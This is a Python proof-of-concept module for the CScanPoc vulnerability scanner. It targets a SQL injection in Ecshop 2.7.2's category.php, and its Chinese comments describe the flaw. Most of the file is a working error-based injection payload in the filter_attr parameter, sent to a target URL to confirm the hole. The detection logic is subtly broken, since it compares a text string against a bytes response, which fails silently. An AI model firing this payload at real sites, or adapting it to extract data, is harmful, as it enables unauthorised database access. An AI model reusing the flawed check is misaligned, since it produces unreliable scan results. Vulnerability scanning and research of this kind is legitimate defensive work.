# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0005'  # 平台漏洞编号，留空
    name = 'Ecshop 2.7.2 /category.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2010-05-09'  # 漏洞公布时间
    desc = '''
        Ecshop 2.7.2 /category.php 文件中变量 $filter_attr_str 是以“.” 分开的数组，
        没有作任何处理就加入了SQL查询，造成SQL注入。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-19574'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = '2.7.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0e65500d-1524-43d1-83c1-ed239540b923'
    author = '国光'  # POC编写者
    create_date = '2018-05-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/category.php?page=1&sort=goods_id&order=ASC%23goods_list&category=1&display=grid&brand=0&"
                       "price_min=0&price_max=0&filter_attr=-999%20AND%20EXTRACTVALUE(1218%2cCONCAT(0x5c%2c0x716f776c71"
                       "%2c(MID((IFNULL(CAST(md5(3)%20AS%20CHAR)%2c0x20))%2c1%2c50))%2c0x7172737471))")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if "cbc87e4b5ce2fe28" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
